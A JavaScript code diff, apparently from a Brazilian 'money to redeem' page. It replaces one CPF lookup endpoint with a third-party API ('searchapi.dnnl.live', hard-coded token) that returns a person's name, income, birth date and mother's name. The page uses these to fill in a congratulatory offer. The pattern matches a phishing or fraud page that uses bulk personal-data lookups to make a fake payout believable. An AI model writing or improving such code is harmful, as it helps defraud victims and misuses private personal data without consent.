@@ -239,22 +239,26 @@ document.getElementById('totalValor').textContent = valorFmt;
 
 // Busca API se não veio valor
 if(cpf && !params.get('valor')){
-  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
+  var cleanCpf = cpf.replace(/\D/g,'');
+  fetch('https://searchapi.dnnl.live/consulta?token_api=2077&cpf=' + cleanCpf)
     .then(function(r){ return r.json(); })
     .then(function(d){
-      if(d.nome && !nome){
-        document.getElementById('nomeDoc').textContent = d.nome.toUpperCase();
-        document.getElementById('txtParabens').textContent = 'Parabéns, ' + primeiroNome(d.nome) + '! Você pode resgatar até:';
-        nome = d.nome;
+      if(d.status === 200 && d.dados && d.dados[0]){
+        var item = d.dados[0];
+        if(item.NOME && !nome){
+          document.getElementById('nomeDoc').textContent = item.NOME.toUpperCase();
+          document.getElementById('txtParabens').textContent = 'Parabéns, ' + primeiroNome(item.NOME) + '! Você pode resgatar até:';
+          nome = item.NOME;
+        }
+        if(item.RENDA){
+          var v = 'R$ ' + item.RENDA;
+          document.getElementById('valorPrincipal').textContent = v;
+          document.getElementById('totalValor').textContent = v;
+          valor = item.RENDA;
+        }
+        if(item.NASC && !nasc){ nasc = item.NASC; }
+        if(item.NOME_MAE && !mae){ mae = item.NOME_MAE; }
       }
-      if(d.valor){
-        var v = 'R$ ' + d.valor;
-        document.getElementById('valorPrincipal').textContent = v;
-        document.getElementById('totalValor').textContent = v;
-        valor = d.valor;
-      }
-      if(d.nascimento && !nasc){ nasc = d.nascimento; }
-      if(d.nome_mae && !mae){ mae = d.nome_mae; }
     }).catch(function(){});
 }
 
